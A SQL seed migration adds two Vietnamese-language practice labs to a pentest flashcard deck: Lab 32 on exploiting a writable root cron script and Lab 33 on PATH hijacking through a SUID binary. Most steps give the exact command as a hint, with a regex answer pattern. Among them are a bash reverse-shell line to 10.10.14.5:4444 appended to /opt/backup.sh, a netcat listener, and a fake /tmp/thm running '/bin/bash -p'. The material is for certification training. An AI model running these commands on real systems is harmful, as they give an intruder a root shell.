-- 0075_labs_cron_privesc_and_path_hijack: two more typed-command practice
-- labs for the pentest "labs" deck, covering the two remaining command
-- chains discussed this session that weren't yet turned into drills:
-- Lab 32 walks the full writable-cron-script exploit chain end to end
-- (find the job -> check write access -> read existing content -> inject
-- payload -> matching listener -> pspy fallback). Lab 33 walks PATH
-- hijacking end to end, including the gcc compile + chmod +s steps from
-- the SUID screenshot that started this topic.

INSERT INTO cards (deck_id, kind, front, payload, source)
SELECT d.id, 'lab', c.front, c.payload::jsonb, 'seed'
FROM (VALUES
  ('Lab 32 — Cron job ghi được: từ phát hiện tới reverse shell root', '{"scenario": "Nghi ngờ có cron job hệ thống chạy quyền root trên 1 script mà mình ghi được. Đi từng bước: xác minh script nào được chạy, kiểm tra quyền ghi, đọc nội dung hiện có, cấy payload, rồi bắt shell.", "steps": [{"prompt": "Xem cron job hệ thống đang cấu hình chạy script nào, với quyền của user nào.", "hint": "cat /etc/crontab", "type": "command", "patterns": ["cat\\s+/etc/crontab"], "explanation": "/etc/crontab liệt kê job định kỳ hệ thống kèm user chạy (thường root) và đường dẫn script — luôn là bước đầu tiên khi nghi cron privesc."}, {"output": "-rwxrwxrwx 1 root root 312 ... /opt/backup.sh", "prompt": "Kiểm tra quyền của script /opt/backup.sh mà cron vừa chạy — mình có ghi được không?", "hint": "ls -la /opt/backup.sh", "type": "command", "patterns": ["ls\\s+-la\\s+/opt/backup\\.sh"], "explanation": "rwxrwxrwx (hoặc owner trùng user hiện tại) nghĩa là AI CŨNG ghi được — dù script thuộc root, cron vẫn chạy nó với quyền root bất kể ai sửa nội dung cuối cùng."}, {"prompt": "Đọc trước nội dung script — đôi khi đã có sẵn 1 payload cũ (từ lần khai thác trước/máy demo), cần biết trước khi tự thêm payload mới.", "hint": "cat /opt/backup.sh", "type": "command", "patterns": ["cat\\s+/opt/backup\\.sh"], "explanation": "Luôn đọc trước khi ghi — tránh phá vỡ logic cũ (nếu có) và biết chắc có payload nào đã tồn tại sẵn hay chưa, port nào đang được dùng."}, {"prompt": "Script ghi được và còn sạch. Thêm 1 dòng reverse shell vào CUỐI file (không xoá nội dung cũ) để khi cron chạy sẽ bắn shell root về máy mình (IP 10.10.14.5, cổng 4444).", "hint": "echo ''bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'' >> /opt/backup.sh", "type": "command", "patterns": ["echo\\s+.?bash\\s+-i\\s+>&\\s*/dev/tcp/10\\.10\\.14\\.5/4444\\s+0>&1.?\\s*>>\\s*/opt/backup\\.sh"], "explanation": ">> ghi NỐI vào cuối file (append), không phải > (sẽ xoá sạch nội dung cũ, dễ làm script lỗi và lộ dấu vết, hoặc làm cron fail im lặng)."}, {"prompt": "Mở listener netcat đúng cổng vừa cấy vào payload, chờ cron tới giờ chạy.", "hint": "nc -lvnp 4444", "type": "command", "patterns": ["nc\\s+-lvnp\\s+4444", "nc\\s+-nvlp\\s+4444", "nc\\s+-nlvp\\s+4444"], "explanation": "Cổng listener PHẢI khớp chính xác với cổng đã ghi trong payload — chờ tới chu kỳ cron tiếp theo (xem lại /etc/crontab để biết tần suất chạy) là có shell root."}, {"prompt": "Không có quyền đọc /etc/crontab (không phải root) nhưng nghi có cron job ẩn khác. Công cụ nào giúp phát hiện cron job đang chạy mà không cần quyền đọc crontab?", "type": "choice", "choices": ["pspy — theo dõi TẤT CẢ process mới sinh ra theo thời gian thực, không cần quyền đọc crontab", "Không có cách nào, chỉ root mới biết được", "crontab -l luôn hiển thị được dù không phải root"], "answer": 0, "explanation": "pspy quét /proc liên tục để bắt mọi process mới khởi chạy — kể cả cron job của root — mà không cần đọc trực tiếp file crontab."}], "difficulty": "trung_binh", "cert_tags": ["THM PT1"]}'),
  ('Lab 33 — PATH Hijacking: từ compile SUID tới shell root', '{"scenario": "Tìm thấy 1 binary SUID tự biên dịch, gọi lệnh hệ thống không ghi full path. Biên dịch, cấp SUID, rồi khai thác qua biến PATH.", "steps": [{"prompt": "Có source C gọi system(\"thm\") không ghi full path. Biên dịch nó thành binary, tắt warning khi compile.", "hint": "gcc exploit.c -o exploit -w", "type": "command", "patterns": ["gcc\\s+exploit\\.c\\s+-o\\s+exploit\\s+-w"], "explanation": "-w tắt warning — nhiều PoC cũ dùng syntax implicit (vd main() không khai báo kiểu trả về) gây warning không ảnh hưởng tới việc chạy."}, {"prompt": "Gắn bit SUID cho binary vừa compile để nó luôn chạy với quyền của OWNER (root) bất kể ai thực thi.", "hint": "chmod u+s exploit", "type": "command", "patterns": ["chmod\\s+u\\+s\\s+exploit"], "explanation": "chmod u+s thêm SUID bit — u = user (owner), +s = set-id. Từ giờ bất kỳ ai chạy file này đều chạy với quyền owner, không phải quyền của chính người chạy."}, {"output": "-rwsr-xr-x 1 root root 16792 ... exploit", "prompt": "Xác nhận binary đã có SUID bit set đúng (owner root, ký hiệu s thay vì x).", "hint": "ls -l exploit", "type": "command", "patterns": ["ls\\s+-l\\s+exploit"], "explanation": "Cột quyền hiển thị -rwsr-xr-x — chữ s (thay vì x) ở vị trí quyền thực thi của owner là dấu hiệu SUID bit đã bật."}, {"prompt": "Giả sử không có source code, chỉ có binary đã compile sẵn. Kiểm tra bên trong nó gọi lệnh hệ thống nào mà không ghi full path (vd thm thay vì /bin/thm).", "hint": "strings exploit | grep -E \"system|exec\"", "type": "command", "patterns": ["strings\\s+exploit\\s*\\|\\s*grep\\s+-E\\s+.?system\\|exec.?"], "explanation": "strings lộ ra các chuỗi text nhúng trong binary kể cả không có source — tên lệnh được gọi qua system()/exec() thường xuất hiện gần các từ khoá này."}, {"prompt": "Xem thứ tự thư mục trong biến PATH hiện tại — thư mục nào được tìm trước sẽ được ưu tiên.", "hint": "echo $PATH", "type": "command", "patterns": ["echo\\s+\\$PATH"], "explanation": "Shell tìm lệnh theo ĐÚNG thứ tự thư mục trong PATH, dừng lại ở thư mục đầu tiên tìm thấy tên lệnh khớp."}, {"prompt": "Tạo 1 file tên trùng với lệnh bị gọi (thm) chứa shell giữ nguyên quyền, đặt vào thư mục ghi được /tmp.", "hint": "echo ''/bin/bash -p'' > /tmp/thm", "type": "command", "patterns": ["echo\\s+.?/bin/bash\\s+-p.?\\s*>\\s*/tmp/thm"], "explanation": "-p (giữ nguyên effective ID, không tự hạ quyền) là bắt buộc — bash mặc định tự hạ quyền xuống real UID khi phát hiện chạy dưới SUID, mất hết tác dụng của SUID nếu thiếu -p."}, {"prompt": "Cấp quyền thực thi cho file vừa tạo.", "hint": "chmod +x /tmp/thm", "type": "command", "patterns": ["chmod\\s+\\+x\\s+/tmp/thm"], "explanation": "Không có quyền thực thi thì shell không gọi được file này dù PATH đã trỏ đúng tới nó."}, {"prompt": "Prepend /tmp lên đầu biến PATH để file giả của mình được tìm thấy TRƯỚC bản thật trong /usr/bin.", "hint": "export PATH=/tmp:$PATH", "type": "command", "patterns": ["export\\s+PATH=/tmp:\\$PATH"], "explanation": "PATH=/tmp:$PATH đặt /tmp lên ĐẦU danh sách — ghi ngược lại (vd PATH=$PATH:/tmp) sẽ làm /tmp bị tìm SAU CÙNG, mất tác dụng vì bản thật trong /usr/bin được tìm thấy trước."}, {"prompt": "Chạy lại binary SUID — giờ nó sẽ gọi file giả /tmp/thm thay vì lệnh thật.", "hint": "./exploit", "type": "command", "patterns": ["\\./exploit"], "explanation": "Binary chạy system(\"thm\") -> shell tìm theo PATH mới -> thấy /tmp/thm trước -> chạy /bin/bash -p với quyền SUID (root) -> có shell root ngay."}], "difficulty": "trung_binh", "cert_tags": ["THM PT1"]}')
) AS c(front, payload)
JOIN decks d ON d.slug = 'labs'
  AND d.subject_id = (SELECT id FROM subjects WHERE slug = 'pentest')
ON CONFLICT DO NOTHING;
